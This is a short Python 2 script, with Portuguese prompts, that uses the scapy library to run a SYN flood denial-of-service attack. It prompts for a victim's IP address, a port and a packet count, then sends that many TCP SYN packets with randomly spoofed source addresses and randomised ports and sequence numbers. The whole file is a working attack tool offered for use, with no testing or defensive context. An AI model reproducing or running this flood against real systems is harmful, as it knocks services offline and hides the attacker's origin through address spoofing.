import sys
import random
from scapy.all import *

def SYN_Flood(dstIP,dstPort,limit):
	total = 0
	print "Enviando Pacotes"
	for x in range (0,limit):
		IP_Packet = IP()
		IP_Packet.src = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
		IP_Packet.dst = dstIP

		TCP_Packet = TCP ()	
		TCP_Packet.sport = random.randint(1000,9000)
		TCP_Packet.dport = dstPort
		TCP_Packet.flags = "S"
		TCP_Packet.seq = random.randint(1000,9000)
		TCP_Packet.window =random.randint(1000,9000)

		print("Source: "+IP_Packet.src+":"+str(TCP_Packet.sport))
		send(IP_Packet/TCP_Packet)
		total+=1
	

def main():

	victim_IP = raw_input ("\n"+"Insira o IP da vitima:")
	victim_port = input ("Insira a porta para ataque: ")
	limit = input ("Quantidade de pacotes a enviar:")
	SYN_Flood(victim_IP,victim_port,int(limit))

main()